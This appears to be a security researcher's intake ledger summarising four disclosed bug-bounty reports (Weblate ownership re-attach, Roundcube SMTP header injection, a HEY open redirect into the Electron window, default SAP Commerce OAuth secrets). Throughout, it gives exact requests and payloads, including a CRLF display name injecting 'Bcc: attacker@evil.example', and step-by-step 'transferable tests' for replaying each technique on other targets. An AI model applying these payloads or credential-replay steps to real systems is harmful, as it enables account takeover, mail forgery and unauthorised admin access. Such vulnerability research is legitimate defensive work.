### §INTAKE-2026-11-25/01 — DE-PROVISIONING DELETES THE MEMBERSHIP ROW BUT LEAVES THE CREATOR FOREIGN KEY: ONE ANONYMOUS-SHAPED `GET` ON A PUBLIC DONATION ROUTE RE-ADDS A REMOVED OWNER THROUGH THE `user_id` FALLBACK, TOKEN ROTATION INCLUDED

SOURCE: https://hackerone.com/reports/4118627 (Weblate — weblate.org customer portal, "a removed customer owner regains ownership with one GET to /fosdem/donate/, even after token rotation, and can lock out the other owners", Improper Access Control, Medium 6.8 `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N`, disclosed 2026-11-24, created 2026-10-16)  read 2026-11-25
ROUTE: live `.json` route, HTTP 200, `visibility: full`, `vulnerability_information` 8,037 B read IN FULL (code excerpts with line numbers, two-account HTTP transcript, Django regression-test matrix on main vs fix, interaction-log evidence, remediation diffs).
STATUS: VERIFIED-BY-REPORT on a local instance (the reporter ran it on `WeblateOrg/website` main @ 7d0a3f762, 2026-10-16, and shipped the pass/fail test table); NOT reproduced by us — no Weblate website instance or SAML stand-in was stood up this pass.
CLASS: broken access control / de-provisioning gap — the removal destroys one membership row while a creator back-reference on the parent record keeps pointing at the removed user, and every `get_or_create(user_id=…)` caller re-materialises the membership.
CORE METHOD (as the report states it):
  1. Establish what removal actually does: `customer_owner()` (`views.py` L1234-1246) calls `owners.remove(owner)` and logs an interaction — "`user_id` is not touched". So `Customer.owners` loses the row, `Customer.user_id` (the user who CREATED the customer) still names the removed person.
  2. Find every read path that resolves a customer by that column instead of by membership: `get_customer()` (`views.py` L186-205) — "when the requester owns no customer, which is the state removal leaves them in, it falls through to the same re-add" — and `fosdem_donation()` (`views.py` L1673-1693), which is "neither `@login_required` nor POST-only". Both do `Customer.objects.get_or_create(origin=PAYMENTS_ORIGIN, user_id=request.user.id, defaults={"email": request.user.email})[0]` followed by `customer.owners.add(request.user)`.
  3. Note the bypassed controls (this is the whole finding): commit b726a3ffd made owners "explicit peers with full control" with audited removal; 550fe33a0 ("fix(security): require consent for customer owners") makes a new owner accept an invitation first. "The `user_id` path skips both controls" — no invitation, no consent, no e-mail, no log entry.
  4. Negative control that proves the revocation worked: remaining owner POSTs `/en/customer/1/owners/` with `owner=1&remove=1` → 302; the removed account now `GET /en/customer/1/` → **404**, activation token gone from `/en/user/`.
  5. Second control: the remaining owner presses "Refresh token" (`POST /en/subscription/token/1/`) — token changes `pz33sE…` → `XcGhSA…`, and the OLD token gets **404** from `POST /api/support/`.
  6. THE RE-ATTACH: the removed user simply loads `https://weblate.org/en/fosdem/donate/?amount=30` → 302 to a payment page (nothing has to be paid) → `GET /en/customer/1/` returns **200** and `/en/user/` now shows the ROTATED token `XcGhSA…`. E-mails sent by that step: 0.
  7. Escalate to full control: as owner again, the removed user POSTs `/en/customer/1/owners/` with `owner=2&remove=1` — the owner who removed them now gets 404. The customer's interaction log shows "bianca removing alex and then alex removing bianca, with nothing in between" — a non-owner removing an owner, to anyone reading the CRM.
  8. Regression tests shipped with the report encode the invariant: "removed owner opens /fosdem/donate/, must stay removed" FAIL on main / ok with fix; same for the donate form POST and for "must not be able to remove the remaining owner".
DETECTION SIGNAL: any app where a membership/role row is the ONLY thing deleted on offboarding while the parent object still stores `user_id` / `creator_id` / `created_by` / `owner_id` / `primary_contact` (look for the FK remaining populated after "Remove", "Revoke", "Deactivate", "Transfer"); handlers that call `get_or_create(<scope>, user_id=request.user.id)` or `Model.objects.filter(created_by=request.user)` and then write a membership; GET-reachable "start checkout / donate / subscribe / create workspace" routes that create-or-fetch the tenant as a side effect; a codebase where a security fix added an INVITATION/CONSENT gate on the canonical add-owner route but other writers of the same table were not audited; a removal that returns 404 for the removed user while the same user's own profile still resolves a tenant id.
CHAIN: a removed owner (primitive: holds ordinary authenticated credentials, zero current privilege) -> an unrelated self-service GET/POST on a public payment/discovery route (primitive: the route resolves the tenant by creator FK and re-adds the caller without invitation or consent) -> the removal the victim performed AND the token rotation they performed are both undone, silently, with no CRM log entry (escalation: revocation is not durable) -> the attacker reads the rotated service activation token, edits billing/VAT details, cancels recurring payments, downloads invoices, and removes every remaining owner so the paying customer is locked out of their own account (terminal: account takeover of a billing tenant; reporter scored C:H/I:H, Medium on AC:H).
TRANSFERABLE TEST: on the next multi-tenant app, (1) create tenant A with account X, invite Y as a peer admin/owner, have Y REMOVE X and rotate every secret the portal offers; (2) confirm X really is out (404 on the tenant, old token rejected); (3) as X, walk EVERY self-service route that provisions or fetches a tenant — donate, subscribe, start-trial, create-workspace, "discovery" signup, support-form, checkout return URL — as a GET *and* as the POST, and after each one re-request the tenant root; (4) a 200 where the 404 was, plus any rotated secret now visible to X, is the finding; (5) finish by proving the lockout direction (X removes the legitimate remaining owner). Rule: **de-provisioning must delete the BACK-REFERENCES, not just the membership row — grep for every `get_or_create`/`filter` on `creator`/`user_id`/`created_by` in the tenant-resolution path, because a `user_id` fallback is an unauthenticated-shaped re-invite that bypasses invitation, consent and logging.**
DEDUPE/DELTA: `4118627`, `fosdem`, `owners.add`, `Customer.owners`, `7d0a3f762`, `can_download_payment_invoice` = 0 hits across all three write targets. Recorded neighbours REVIEWED and NOT conflated: the "stale token in the OLD mailbox still resets the password after the victim re-keys the account" entry (ledger ~15154) is credential-REISSUE surviving a remediation — here the re-issued credential is *legitimately* rotated and the attacker re-reads the NEW one because access itself is restored; ledger 16577 ("an approval gate enforced in one flow is not a gate — every sibling flow that touches account state is a second door") is the closest SHAPE, but it is a lifecycle TRANSITION pre-approval, whereas this is a removed RELATIONSHIP being re-created from a leftover foreign key; §INTAKE-2026-11-22/13 (`/Account/Register`) is self-service account CREATION, not re-attachment to an existing tenant. NEW atoms: (a) the back-reference column (`user_id`) surviving the removal, (b) `get_or_create`-by-creator as the re-add mechanism, (c) the GET-only, payment-page-shaped route with no login requirement on the *route* semantics, (d) proof that token rotation does not help, (e) the CRM log gap. HONESTY: not reproduced by us; every commit hash, line number, HTTP status and the fix are the reporter's; severity (6.8, AC:H) is the program's.

### §INTAKE-2026-11-25/02 — THE SANITIZER STRIPS CONTROL CHARACTERS, THEN A SECOND FUNCTION DECODES AN ESCAPE SEQUENCE INTO ONE: TWO LITERAL BYTES `\r` PASS THE CRLF FILTER AND `stripcslashes()` EMITS A REAL CR AFTERWARDS; A MAILER THAT FOLDS ONLY CRLF AND A SMTP CLIENT THAT PROMOTES A LONE CR TO CRLF TURN IT INTO A HEADER BLOCK

SOURCE: https://hackerone.com/reports/3913007 (Roundcube Webmail, "SMTP header injection via C-escape `\r` in the recipient display name", disclosed 2026-10-18, created 2026-08-03)  read 2026-11-25
ROUTE: live `.json` route, HTTP 200, `visibility: full`, `vulnerability_information` 3,512 B read IN FULL (file/line chain, exact `_to` value, on-the-wire capture, impact list). Metadata caveat recorded honestly below.
STATUS: VERIFIED-BY-REPORT by the reporter's own executable proof against the real repository + vendor code (a PHP script asserting standalone `Bcc:`/`Sender:` header lines on the wire, "Result: PASS"); NOT reproduced by us — no Roundcube or SMTP sink was stood up this pass. PROGRAM RATING: `severity.rating: none`, score 0.0 (not triaged as a bounty finding) — recorded as rated, and admitted to this ledger as a METHOD, not as a reportable precedent.
CLASS: CRLF / SMTP header injection reached by a SANITIZE-THEN-DECODE ordering defect (CWE-93 → CWE-116), i.e. the input has no control character when the filter runs.
CORE METHOD (as the report states it):
  1. Read the filter first. `rcmail_sendmail::email_input_format()` strips CR/LF at `program/include/rcmail_sendmail.php:760`. Twenty-five lines later, at `:790`, it calls `$name = stripcslashes($name);` on the recipient's DISPLAY NAME.
  2. Submit the two-character sequence — backslash followed by the letter `r`, not a control character — inside a quoted display name via `POST /?_task=mail&_action=send` with a valid `_token`:
     `_to="x\rBcc: attacker@evil.example\rSender: ceo@victim-corp.example\rX-Pad: p" <victim@example.com>`
  3. Confirm each layer leaves it alive, in order: `:112` reads the raw value; the `:760` strip "matches nothing" (no control byte exists yet); `:790` materialises three real 0x0D bytes; `format_email_recipient()` (`program/lib/Roundcube/bootstrap.php:329-333`) escapes only `"`; `Mail_mimePart::encodeHeader()` folds only `/[\r?\n[\s\t]*/` so "a lone CR is never matched", and its non-ASCII test `preg_match('#([^\s\x21-\x7E]){1}#')` classifies CR as WHITESPACE, so no RFC2047 encoding is applied either; finally `Net_SMTP::quotedata()` (`vendor/pear/net_smtp/Net/SMTP.php:1489`) "normalises every lone CR into a full CRLF".
  4. Read the on-the-wire result rather than the app's response — the proof asserts `Bcc: attacker@evil.example` and `Sender: ceo@victim-corp.example` are standalone CRLF-delimited header lines after `To: "x`.
  5. Claim only what the wire shows: forged `From:`/`Sender:`/`Reply-To:` (which bypasses the server-side identity lookup at `rcmail_sendmail.php:147-175` and the `identities_level` pinning at `program/actions/settings/identity_save.php:64-79`), covert `Bcc:`, forged trust-signal headers (`Received:`, `Authentication-Results:`, `X-Spam-Status:`), and an injected empty line to terminate the header block and control the body the MTA parses.
DETECTION SIGNAL: a sanitizer that strips `\r`/`\n`/NUL by CHARACTER CODE while another function later decodes ESCAPE SEQUENCES on the same value (`stripcslashes`, `urldecode`, `html_entity_decode`, `json.loads`, `unicode_escape`, `String.raw` inverse, `ast.literal_eval`-style helpers, template unescaping) — the decode must be AFTER the filter for the class to apply; header builders that escape one quote character only; mime/header encoders whose fold regex requires a CRLF PAIR (`\r?\n`) so a lone CR is invisible; non-ASCII detectors that treat `\x00-\x20` as whitespace; and any mail path where the composed header array is described as "built from a fixed key set" (the fixed key set is the documentable intent, the injected bytes are the bug).
CHAIN: any authenticated mailbox user (primitive: can send mail through the server's own submission credentials) -> put `\r`-escape sequences in a display name, which the CRLF strip cannot see (primitive: filter runs before the decode) -> `stripcslashes()` emits real CRs that every downstream layer fails to fold (escalation: arbitrary RFC-822 header emission from a domain whose SPF/DKIM legitimately passes) -> forged sender + covert Bcc + forged `Authentication-Results`/`X-Spam-Status`, delivered as authenticated mail (terminal: phishing/impersonation from the victim's own domain, i.e. a credential-harvest chain with the trust signals pre-broken — program rated it `none`, so treat as a primitive to CHAIN, never as a headline).
TRANSFERABLE TEST: on every form that builds an outbound message (contact, invite, ticket, share-notification, support, webmail), (1) list the sanitizers on the field and the ORDER they run in — look for any decode/unescape that runs after the control-character strip; (2) inject the ESCAPED form of every delimiter the sink cares about: `\r`, `\n`, `%0d%0a` double-encoded, `\u000d`, `&#13;`, `\x0d`, plus `\t` and a leading `\ ` for header folding; (3) read the RECEIVED message source (your own mailbox / a mail sink you control), not the app response — grep the raw headers for a standalone line you injected (`Bcc:`, `X-Pad:`, `Sender:`); (4) if only one of a pair of characters is stripped, look for the decoding function that puts it back. Rule: **a sanitizer that removes control characters from the RAW input is defeated by any later function that DECODES escape sequences — always test the two-character form (`\r`, `%0d`, `\u000d`) against a mail header sink and confirm on the wire, because header encoders fold CRLF pairs and mail clients promote lone CRs.**
DEDUPE/DELTA: `3913007`, `rcmail_sendmail`, `stripcslashes`, `quotedata`, `Mail_mimePart`, `X-Pad` = 0 hits across all three write targets. Recorded neighbours REVIEWED and NOT conflated: the ledger's mail-parser/IDN entries (~7729-7752, sendmail/Postfix source routes, `ORCPT` smuggling) attack the ADDRESS the mailer resolves — this attacks the HEADER BLOCK the mailer emits; ledger 3411/4651 are CRLF injection through EDGE RULE-ENGINE parameters (hex escapes in a rule string, host-header smuggling); §17.111 is an inbound-email trust bug (`From:` header drives an action). NEW atoms: (a) the decoder running AFTER the strip (`stripcslashes` at `:790` vs the strip at `:760`), (b) a fold regex that requires a CRLF pair so a LONE CR survives, (c) the non-ASCII classifier treating CR as whitespace so no RFC2047 is applied, (d) `Net_SMTP::quotedata()` promoting lone CR → CRLF as the final amplifier. HONESTY: not reproduced by us; all line numbers, the payload, the wire capture and the impact bullets are the report's; the program did NOT triage it as a vulnerability (rating `none`), which is stated here rather than smoothed over.

### §INTAKE-2026-11-25/03 — A CLIENT THAT TRUSTS "SAME ORIGIN + ENDS WITH `/print`" IS DEFEATED BY AN OPEN REDIRECT ONE LETTER AWAY: `HTTPS://` SKIPS A CASE-SENSITIVE SCHEME CHECK, THE ENDPOINT 302s TO THE RAW URL, AND THE DESKTOP APP LOADS THE ATTACKER PAGE IN A CHROMELESS WINDOW

SOURCE: https://hackerone.com/reports/3972760 (Basecamp/HEY — "Open redirect on app.hey.com bypasses HEY desktop's internal-origin allowlist and loads attacker content inside a HEY BrowserWindow", Open Redirect, Medium 6.1 `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`, disclosed 2026-10-15, created 2026-08-27)  read 2026-11-25
ROUTE: live `.json` route, HTTP 200, `visibility: full`, `vulnerability_information` 6,716 B read IN FULL (two curl transcripts, the three checks it passes, the Electron source excerpt, the second same-origin path, the sibling occurrence in the image rewriter, the fix).
STATUS: VERIFIED-BY-REPORT on a real install (HEY for Linux 1.3.6, Electron 40.9.3; the destination server logged the fetch with UA `HEY/1.3.6 Chrome/144.0.7559.236 Electron/40.9.3`); NOT reproduced by us.
CLASS: client-side security misconfiguration WITH demonstrated impact — an open redirect used as the ORIGIN-LAUNDERING step that defeats a desktop client's "internal URL" allowlist (open redirect alone is doctrine §2(b); this entry exists because of the chain).
CORE METHOD (as the report states it):
  1. Find the proxy/redirect helper and watch its scheme comparison for case: `app.hey.com/proxy_image` "compares the URL scheme case-sensitively". Lowercase behaves correctly, uppercase does not:
     `curl -sI "https://app.hey.com/proxy_image/https%3A%2F%2Fexample.com%2F"` → `302 location: https://gopher.hey.com/<sig>/https://example.com/`
     `curl -sI "https://app.hey.com/proxy_image/HTTPS%3A%2F%2Fexample.com%2F"` → `302 location: HTTPS://example.com/`
  2. Prove it is the COMPARISON and not a missing filter: `javascript:` still returns 403. Schemes are case-insensitive per RFC 3986 §3.1, so `HTTPS://` is a valid URL, not malformed input.
  3. Read the client's gate and satisfy it literally. `dist-js/index.js:72-74`: `else if (Stage.current.locationIsInternal(url) && (url.endsWith(".text") || url.endsWith("/print"))) { createWindow(url); }` — same origin, plus a suffix, nothing else. So the delivered link is
     `https://app.hey.com/proxy_image/HTTPS%3A%2F%2Fexample.com%2F?x=/print`
     with TWO requirements the report calls out: percent-encode the inner URL (unencoded, Rails collapses `//` and the `Location` becomes `HTTPS:/example.com/`, which resolves relative to app.hey.com), and end the URL in `/print` or `.text` — `?x=/print` satisfies the allowlist without touching the destination.
  4. Note why the two earlier checks do not save it: the mail sanitizer keeps any http-family link; `hey-message-content` only routes links out to the OS browser when `element.origin != location.origin` — this link's origin genuinely IS app.hey.com, so it is treated as internal and handed to the app. Three checks, each correct alone, all passed by a URL that really is HEY's.
  5. Second same-origin path, no redirect needed: `Stage.isInternalAttachmentLink` (`dist-js/stage.js:47-52`) admits same-origin URLs carrying `?disposition=attachment` with no external-link guard — the reporter quotes the code's own comment warning that matching the raw substring instead of an internal URL would "load an attacker page inside the chromeless app window".
  6. Same root cause, second location (no impact found, reported as evidence of a systemic comparison): the inbound mail image rewriter leaves `<img src="HTTPS://host/pixel.png">` unproxied. Ten other unusual forms (`//host`, `https:/host`, `https:host`, `:443`, leading whitespace, query+fragment) are all proxied correctly — only scheme CASE escapes. CSP `img-src` blocked every attempt to turn it into a leak, so it is stated as a non-impact.
DETECTION SIGNAL: an outbound link/image proxy on the PRIMARY auth domain (`/proxy_image`, `/proxy`, `/redirect`, `/link`, `/url`, `/image?src=`, `/open?url=`); a scheme/allowlist comparison written as `==`/`===`/`startsWith`/`endsWith` on a raw string rather than on a parsed+lowercased scheme; a desktop wrapper whose internal-URL test is `locationIsInternal(url)` plus a PATH SUFFIX (`endsWith("/print")`, `endsWith(".text")`, `?disposition=attachment`); Electron code that calls `createWindow(url)`/`loadURL(url)` after that test; a chromeless/undecorated `BrowserWindow` (no address bar → no origin indicator); any in-app password re-prompt flow (training the user to type credentials into windows the app opens).
CHAIN: remote attacker who knows only the victim's address (primitive: no account, no cookies) -> sends an ordinary message containing `https://app.hey.com/proxy_image/HTTPS%3A%2F%2F<attacker>%2F?x=/print` (primitive: the URL is genuinely same-origin, so link sanitizer, external-link interceptor and Electron allowlist all pass) -> the proxy 302s to the attacker host and the desktop app renders it inside a HEY `BrowserWindow` with no address bar or origin indicator (escalation: origin laundering — the one defence users are taught, "check the URL", was already satisfied) -> a HEY-shaped sign-in/re-auth prompt harvests the password, credible because HEY already shows in-app password prompts before sensitive actions like mailbox export (terminal: full-mailbox takeover; program Medium 6.1 with S:C).
TRANSFERABLE TEST: for every desktop/Electron/mobile-shell app in scope, (1) dump the internal-URL predicate (`locationIsInternal`, `isInternal`, `allowedOrigins`, `startsWith('https://app.')`) and the sink (`createWindow`, `loadURL`, `openExternal`, `WebView.loadUrl`); (2) if the predicate includes a PATH SUFFIX, treat every same-origin redirect as an origin bypass; (3) enumerate the same-origin redirectors/proxies and mutate ONLY the scheme case (`HTTPS://`, `HtTpS://`), then trailing dot, then `//`, then a percent-encoded inner URL — a `302 Location:` to your host where the lowercase form returned a signed proxy URL is the win; (4) deliver the composed link through the app's own message surface and confirm the request arrives from the APP's user agent, not a browser. Rule: **an origin check on a client is only as strong as the origin's own redirect behaviour — any open redirect on the trusted origin defeats `locationIsInternal`-style allowlists, and case-sensitivity in a scheme comparison is the cheapest way to create one.**
DEDUPE/DELTA: `3972760`, `proxy_image`, `locationIsInternal`, `isInternalAttachmentLink`, `gopher.hey.com` (single unrelated hit) = 0 technique hits across all three write targets. Recorded neighbours REVIEWED and NOT conflated: §17.483 (#1016966, Basecamp desktop MIME allowlist + unanchored host regex + `?attachment=true`) is the same PRODUCT FAMILY and the same "client trusts a web-controlled value" shape, but there the bypass is a REGEX WITHOUT ANCHORS over the host and the sink is a DOWNLOAD-AND-AUTO-OPEN MIME; here the host check genuinely passes (the URL IS on app.hey.com) and the redirect is what moves the content, with a path-suffix allowlist as the second gate; §17.72 (deep-link `proceed_to` re-parse) is a wrong-layer check on a parameter; the recorded "open redirect with no added impact is ineligible" doctrine is exactly why this entry is filed as the CHAIN. NEW atoms: (a) scheme-case comparison as the bypass, (b) percent-encoding the inner URL to defeat slash collapsing, (c) the `?x=/print` trick to satisfy a suffix allowlist without changing the destination, (d) the chromeless-window + in-app-password-prompt credibility argument. HONESTY: not reproduced by us; the two curl transcripts, the Electron line numbers, the UA string and the CSP non-impact are the report's; severity 6.1 S:C is the program's.

### §INTAKE-2026-11-25/04 — THE SECRET IN THE VENDOR'S OWN PRODUCT DOCUMENTATION WAS NEVER ROTATED: `client_secret=secret` ON THE OAUTH TOKEN ENDPOINT MINTS A `ROLE_ADMINGROUP` BEARER, AND `introspect` CONFIRMS IT BEFORE YOU TOUCH A SINGLE OBJECT

SOURCE: https://hackerone.com/reports/3966705 (Essity — "Default OAuth2 Credentials on SAP Commerce Cloud — Admin Token via Published Sample Secret", Use of Hard-coded Credentials, CVE-2026-44761 CVSS 9.1, Medium by the program, disclosed 2026-11-24, created 2026-08-24)  read 2026-11-25
ROUTE: live `.json` route, HTTP 200, `visibility: full`, `vulnerability_information` 3,295 B read IN FULL (four numbered requests with responses, the decoded JWT payload, the introspect response, the OCC read, the partial-mitigation observation).
STATUS: VERIFIED-BY-REPORT against a production instance (unauthenticated `POST` returning a live token whose decoded payload carries `ROLE_ADMINGROUP`, plus a catalog read that returns Staged versions); NOT reproduced by us — no SAP Commerce host was touched this pass.
CLASS: authentication bypass / broken auth by DEFAULT CREDENTIAL — a sample value from the vendor's own ImpEx/help documentation left in a production OAuth client (CWE-798/CWE-1392), escalating straight to the highest role in the platform.
CORE METHOD (as the report states it):
  1. Fingerprint the platform and its token endpoint: `/authorizationserver/oauth/token`, `/authorizationserver/oauth/introspect`, `/occ/v2/` — SAP Commerce Cloud (hybris) storefronts expose these on the same host as the shop.
  2. Take the SAMPLE client ids and the literal sample secret `secret` from SAP's published ImpEx/help documentation — "not a guess or a brute force result, it's the literal sample value from SAP's ImpEx documentation that was never changed for production".
  3. Mint, with no authentication, no account and no session:
     `POST /authorizationserver/oauth/token` · `Content-Type: application/x-www-form-urlencoded` · body `client_id=<sample-client>&client_secret=secret&grant_type=client_credentials` → `200 {"access_token":"…","token_type":"Bearer","expires_in":3599}`.
  4. Read the ROLE out of the token rather than assuming it — decoded JWT payload: `{"sub":"…","roles":["ROLE_ADMINGROUP"],"iss":"https://<host>/authorizationserver","exp":…}`. `ROLE_ADMINGROUP` is "the highest privilege level in SAP Commerce".
  5. Repeat for the second documented client: the CMS-manager client authenticates with `secret` too and returns `ROLE_BASECMSMANAGERGROUP`.
  6. Confirm liveness out-of-band before claiming impact: `POST /authorizationserver/oauth/introspect` with Basic auth over the client pair and body `token=<token>` → `{"active":true,"roles":["ROLE_ADMINGROUP"],…}`.
  7. Prove the GAIN with a read that only that role reaches: `GET /occ/v2/<site>/catalogs?fields=FULL` with `Authorization: Bearer <token>` returns the catalog structure with BOTH `Online` and `Staged` versions for every site — i.e. unpublished/soon-to-be-launched data, across 14 storefronts.
  8. Note the partial mitigation and its shape: the client explicitly named in the CVE (`trusted_client`) is now DISABLED, "meaning someone partially mitigated but missed the … clients" — enumerate every documented client, not just the one in the advisory.
DETECTION SIGNAL: SAP Commerce / hybris (`/authorizationserver/oauth/token`, `/occ/v2/`, `/backoffice`, `ROLE_ADMINGROUP`, `ROLE_BASECMSMANAGERGROUP`, `ROLE_<SITE>GROUP`); any OAuth AS that answers `client_credentials` without `scope` validation; product documentation, sample ImpEx, Postman collections, or demo apps in scope that name a `client_id`/`client_secret` pair (`secret`, `password`, `changeme`, `admin`, `1234`, `<clientid>secret`); a `trusted_client`-style well-known client that is disabled while sibling clients remain; a token endpoint that returns a role-bearing JWT you can decode (`roles`, `authorities`, `scope` with `ROLE_`-prefixed values).
CHAIN: unauthenticated internet user (primitive: no account) -> `client_credentials` with the vendor's documented sample pair (primitive: a published default that was never rotated, tracked as its own CVE) -> a bearer token carrying `ROLE_ADMINGROUP`, validated by introspect (escalation: platform-root authentication, no privilege step needed) -> Staged catalog/product/price data across every storefront plus any OCC endpoint accepting the token: CMS pages, user administration, orders, configuration (terminal: full commercial data + content control on a production commerce platform; reporter's CVSS 9.1, program Medium).
TRANSFERABLE TEST: on any platform whose docs you can read, (1) harvest every sample credential from official help portals, ImpEx/seed scripts, SDK quickstarts, Postman collections and shipped demo configs; (2) replay them against the live token/`client_credentials` endpoint of every instance in scope — one request per pair, no brute forcing required; (3) DECODE the returned token and read the roles before using it, and confirm with the AS's `introspect`/`userinfo` so the claim is server-attested; (4) prove impact with the least invasive read the role unlocks (staged/unpublished catalog, user list, CMS content) rather than writes; (5) if the advisory names one client, enumerate the SIBLING documented clients — vendors ship several and mitigations are per-client.
